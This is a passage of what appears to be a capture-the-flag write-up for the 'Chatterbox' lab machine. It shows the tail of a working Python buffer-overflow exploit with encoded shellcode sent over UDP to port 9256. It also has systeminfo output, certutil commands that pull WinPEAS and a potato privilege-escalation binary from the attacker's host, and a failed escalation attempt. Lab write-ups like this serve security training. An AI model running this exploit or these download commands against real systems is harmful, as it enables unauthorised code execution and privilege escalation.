b&quot;\x75\x52\x6e\x76\x6b\x4f\x77\x65\x52\x48\x71\x53\x50&quot;                                                                                                               buf += b&quot;\x6d\x30\x64\x59\x70\x51\x79\x59\x53\x42\x37\x4e\x77&quot;                                                                                                               buf += b&quot;\x62\x37\x70\x31\x4a\x56\x32\x4a\x4d\x42\x32\x39\x31&quot;                                                                                                               buf += b&quot;\x46\x38\x62\x39\x6d\x71\x56\x75\x77\x51\x34\x4d\x54&quot;                                                                                                               buf += b&quot;\x6d\x6c\x39\x71\x59\x71\x54\x4d\x71\x34\x6c\x64\x4c&quot;                                                                                                               buf += b&quot;\x50\x59\x36\x49\x70\x51\x34\x62\x34\x72\x30\x70\x56&quot;                                                                                                               buf += b&quot;\x6f\x66\x32\x36\x31\x36\x42\x36\x50\x4e\x50\x56\x4f&quot;                                                                                                               buf += b&quot;\x66\x42\x33\x72\x36\x52\x48\x50\x79\x46\x6c\x4d\x6f&quot;                                                                                                               buf += b&quot;\x52\x66\x79\x6f\x49\x45\x73\x59\x67\x70\x4e\x6e\x62&quot;                                                                                                               buf += b&quot;\x36\x4f\x56\x79\x6f\x4c\x70\x62\x48\x4b\x58\x62\x67&quot;                                                                                                               buf += b&quot;\x4d\x4d\x63\x30\x69\x6f\x37\x65\x75\x6b\x68\x70\x56&quot;                                                                                                               buf += b&quot;\x55\x33\x72\x62\x36\x51\x58\x63\x76\x33\x65\x37\x4d&quot;                                                                                                               buf += b&quot;\x45\x4d\x59\x6f\x58\x55\x4d\x6c\x4a\x66\x43\x4c\x5a&quot;                                                                                                               buf += b&quot;\x6a\x73\x50\x6b\x4b\x37\x70\x33\x45\x59\x75\x35\x6b&quot;                                                                                                               buf += b&quot;\x71\x37\x4e\x33\x30\x72\x62\x4f\x6f\x7a\x6b\x50\x6e&quot;                                                                                                               buf += b&quot;\x73\x39\x6f\x36\x75\x41\x41&quot;                                                                                                                                                                                                                                                                                                                    # Create a UDP socket                                                                                                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                                                                                                      server_address = ('10.10.10.74', 9256)                                                                                                                                                                                                                                                                                                                    fs = &quot;\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39&quot;                                                                                      p  = &quot;A0000000002#Main&quot; + &quot;\x00&quot; + &quot;Z&quot;*114688 + &quot;\x00&quot; + &quot;A&quot;*10 + &quot;\x00&quot;                                                                                                     p += &quot;A0000000002#Main&quot; + &quot;\x00&quot; + &quot;A&quot;*57288 + &quot;AAAAASI&quot;*50 + &quot;A&quot;*(3750-46)                                                                                                  p += &quot;\x62&quot; + &quot;A&quot;*45                                                                                                                                                         p += &quot;\x61\x40&quot;                                                                                                                                                              p += &quot;\x2A\x46&quot;                                                                                                                                                              p += &quot;\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D&quot; + &quot;C&quot;*9 + &quot;\x60\x43&quot;                                                                         p += &quot;\x61\x43&quot; + &quot;\x2A\x46&quot;                                                                                                                                                 p += &quot;\x2A&quot; + fs + &quot;C&quot; * (157-len(fs)- 31-3)                                                                                                                                 p += buf + &quot;A&quot; * (1152 - len(buf))                                                                                                                                           p += &quot;\x00&quot; + &quot;A&quot;*10 + &quot;\x00&quot;                                                                                                                                                                                                                                                                                                                             print &quot;----&gt;{P00F}!&quot;                                                                                                                                                         i=0                                                                                                                                                                          while i&lt;len(p):                                                                                                                                                                  if i &gt; 172000:                                                                                                                                                                   time.sleep(1.0)                                                                                                                                                          sent = sock.sendto(p[i:(i+8192)], server_address)                                                                                                                            i += sent                                                                                                                                                                sock.close() 
+</code></pre>
+<p>Started a listener, then fired the exploit.
+<img alt="Pasted image 20220203220500.png" src="../Pasted%20image%2020220203220500.png" /></p>
+<p>My first point :) eeek.</p>
+<h2 id="user-flag">User Flag<a class="headerlink" href="#user-flag" title="Permanent link">&para;</a></h2>
+<p><img alt="Pasted image 20220203220632.png" src="../Pasted%20image%2020220203220632.png" /></p>
+<p>SystemInfo</p>
+<pre><code class="language-text">systeminfo
+Host Name:                 CHATTERBOX
+OS Name:                   Microsoft Windows 7 Professional
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00371-222-9819843-86663
+Original Install Date:     12/10/2017, 9:18:19 AM
+System Boot Time:          2/3/2022, 10:37:18 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              2 Processor(s) Installed.
+                    [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                    [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,536 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,425 MB
+Virtual Memory: In Use:    670 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\CHATTERBOX
+Hotfix(s):                 183 Hotfix(s) Installed.
+Hotfix(s):                 183 Hotfix(s) Installed.
+                    [01]: KB2849697
+                    [02]: KB2849696
+                    [03]: KB2841134
+                    [04]: KB2670838
+                    [05]: KB2830477
+                    [06]: KB2592687
+                    [07]: KB2479943
+                    [08]: KB2491683
+                    [09]: KB2506212
+                    [10]: KB2506928
+                    [11]: KB2509553
+                    [12]: KB2533552
+                    [13]: KB2534111
+                    [14]: KB2545698
+                    [15]: KB2547666
+                    [16]: KB2552343
+                    [17]: KB2560656
+                    [18]: KB2563227
+                    [19]: KB2564958
+                    [20]: KB2574819
+                    [21]: KB2579686
+                    [22]: KB2604115
+                    [23]: KB2620704
+                    [24]: KB2621440
+                    [25]: KB2631813
+                    [26]: KB2639308
+                    [27]: KB2640148
+                    [28]: KB2647753
+                    [29]: KB2654428
+                    [30]: KB2660075
+                    [31]: KB2667402
+                    [32]: KB2676562
+                    [33]: KB2685811
+                    [34]: KB2685813
+                    [35]: KB2690533
+                    [36]: KB2698365
+                    [37]: KB2705219
+                    [38]: KB2719857
+                    [39]: KB2726535
+                    [40]: KB2727528
+                    [41]: KB2729094
+                    [42]: KB2732059
+                    [43]: KB2732487
+                    [44]: KB2736422
+                    [45]: KB2742599
+                    [46]: KB2750841
+                    [47]: KB2761217
+                    [48]: KB2763523
+                    [49]: KB2770660
+                    [50]: KB2773072
+                    [51]: KB2786081
+                    [52]: KB2799926
+                    [53]: KB2800095
+                    [54]: KB2807986
+                    [55]: KB2808679
+                    [56]: KB2813430
+                    [57]: KB2820331
+                    [58]: KB2834140
+                    [59]: KB2840631
+                    [60]: KB2843630
+                    [61]: KB2847927
+                    [62]: KB2852386
+                    [63]: KB2853952
+                    [64]: KB2857650
+                    [65]: KB2861698
+                    [66]: KB2862152
+                    [67]: KB2862330
+                    [68]: KB2862335
+                    [69]: KB2864202
+                    [70]: KB2868038
+                    [71]: KB2871997
+                    [72]: KB2884256
+                    [73]: KB2891804
+                    [74]: KB2892074
+                    [75]: KB2893294
+                    [76]: KB2893519
+                    [77]: KB2894844
+                    [78]: KB2900986
+                    [79]: KB2908783
+                    [80]: KB2911501
+                    [81]: KB2912390
+                    [82]: KB2918077
+                    [83]: KB2919469
+                    [84]: KB2923545
+                    [85]: KB2931356
+                    [86]: KB2937610
+                    [87]: KB2943357
+                    [88]: KB2952664
+                    [89]: KB2966583
+                    [90]: KB2968294
+                    [91]: KB2970228
+                    [92]: KB2972100
+                    [93]: KB2973112
+                    [94]: KB2973201
+                    [95]: KB2973351
+                    [96]: KB2977292
+                    [97]: KB2978742
+                    [98]: KB2984972
+                    [99]: KB2985461
+                    [100]: KB2991963
+                    [101]: KB2992611
+                    [102]: KB3003743
+                    [103]: KB3004361
+                    [104]: KB3004375
+                    [105]: KB3006121
+                    [106]: KB3006137
+                    [107]: KB3010788
+                    [108]: KB3011780
+                    [109]: KB3013531
+                    [110]: KB3020370
+                    [111]: KB3020388
+                    [112]: KB3021674
+                    [113]: KB3021917
+                    [114]: KB3022777
+                    [115]: KB3023215
+                    [116]: KB3030377
+                    [117]: KB3035126
+                    [118]: KB3037574
+                    [119]: KB3042058
+                    [120]: KB3045685
+                    [121]: KB3046017
+                    [122]: KB3046269
+                    [123]: KB3054476
+                    [124]: KB3055642
+                    [125]: KB3059317
+                    [126]: KB3060716
+                    [127]: KB3061518
+                    [128]: KB3067903
+                    [129]: KB3068708
+                    [130]: KB3071756
+                    [131]: KB3072305
+                    [132]: KB3074543
+                    [133]: KB3075226
+                    [134]: KB3078601
+                    [135]: KB3078667
+                    [136]: KB3080149
+                    [137]: KB3084135
+                    [138]: KB3086255
+                    [139]: KB3092627
+                    [140]: KB3093513
+                    [141]: KB3097989
+                    [142]: KB3101722
+                    [143]: KB3102429
+                    [144]: KB3107998
+                    [145]: KB3108371
+                    [146]: KB3108381
+                    [147]: KB3108664
+                    [148]: KB3109103
+                    [149]: KB3109560
+                    [150]: KB3110329
+                    [151]: KB3118401
+                    [152]: KB3122648
+                    [153]: KB3123479
+                    [154]: KB3126587
+                    [155]: KB3127220
+                    [156]: KB3133977
+                    [157]: KB3137061
+                    [158]: KB3138378
+                    [159]: KB3138612
+                    [160]: KB3138910
+                    [161]: KB3139398
+                    [162]: KB3139914
+                    [163]: KB3140245
+                    [164]: KB3147071
+                    [165]: KB3150220
+                    [166]: KB3150513
+                    [167]: KB3156016
+                    [168]: KB3156019
+                    [169]: KB3159398
+                    [170]: KB3161102
+                    [171]: KB3161949
+                    [172]: KB3161958
+                    [173]: KB3172605
+                    [174]: KB3177467
+                    [175]: KB3179573
+                    [176]: KB3184143
+                    [177]: KB3185319
+                    [178]: KB4014596
+                    [179]: KB4019990
+                    [180]: KB4040980
+                    [181]: KB976902
+                    [182]: KB982018
+                    [183]: KB4054518
+Network Card(s):           1 NIC(s) Installed.
+                    [01]: Intel(R) PRO/1000 MT Network Connection
+Connection Name: Local Area Connection
+DHCP Enabled:    No
+IP address(es)
+                    [01]: 10.10.10.74 
+</code></pre>
+<p>copy WinPEAS to target.</p>
+<pre><code class="language-cmd">certutil.exe -urlcache -f http://10.10.16.4:80/winPEASx86.exe wp.exe
+</code></pre>
+<h3 id="winpeas-findings">WinPEAS findings:<a class="headerlink" href="#winpeas-findings" title="Permanent link">&para;</a></h3>
+<p><img alt="Pasted image 20220203232007.png" src="../Pasted%20image%2020220203232007.png" /></p>
+<p>Nothing else really cool in WinPEAS - guess I should try exploit suggester. Here are the <strong>local</strong>, <strong>non-metasploit</strong>, exploits.</p>
+<pre><code class="language-text">[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
+    [*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
+    [*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
+    [*]
+[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+    [*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
+</code></pre>
+<h2 id="privesc">PrivEsc<a class="headerlink" href="#privesc" title="Permanent link">&para;</a></h2>
+<h3 id="ms16-075-rotten-potato">MS16-075 - Rotten Potato<a class="headerlink" href="#ms16-075-rotten-potato" title="Permanent link">&para;</a></h3>
+<pre><code class="language-cmd">certutil.exe -urlcache -f http://10.10.16.4:80/potato.exe potato.exe
+</code></pre>
+<p><img alt="Pasted image 20220204002645.png" src="../Pasted%20image%2020220204002645.png" /></p>
+<p>Sleeping for 5 mins....I guess I'll wait for my SYSTEM shell...</p>
+<p>Shell never came back :( coming back to this later.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
